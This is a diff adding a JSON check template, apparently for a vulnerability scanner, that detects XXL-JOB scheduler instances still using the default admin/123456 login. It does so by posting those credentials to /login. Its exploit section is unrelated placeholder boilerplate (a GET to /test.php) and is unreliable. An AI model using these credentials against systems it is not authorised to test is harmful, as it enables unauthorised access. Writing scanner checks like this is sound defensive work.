@@ -1,0 +1,105 @@
+{
+      "Name": "XXL-JOB Default Login",
+      "Level": "2",
+      "Tags": [
+            "defaultaccount"
+      ],
+      "GobyQuery": "app=\"XXL-JOB\" || title=\"任务调度中心\"",
+      "Description": "A distributed task scheduling framework.",
+      "Product": "XXL-JOB",
+      "Homepage": "https://www.xuxueli.com/xxl-job/",
+      "Author": "",
+      "Impact": "XXL-JOB Default Login (admin/123456)",
+      "Recommendation": "",
+      "References": [
+            "https://github.com/xuxueli/xxl-job"
+      ],
+      "HasExp": true,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/login",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+                        },
+                        "data_type": "text",
+                        "data": "userName=admin&password=123456"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "not contains",
+                                    "value": "500",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/test.php",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "test",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
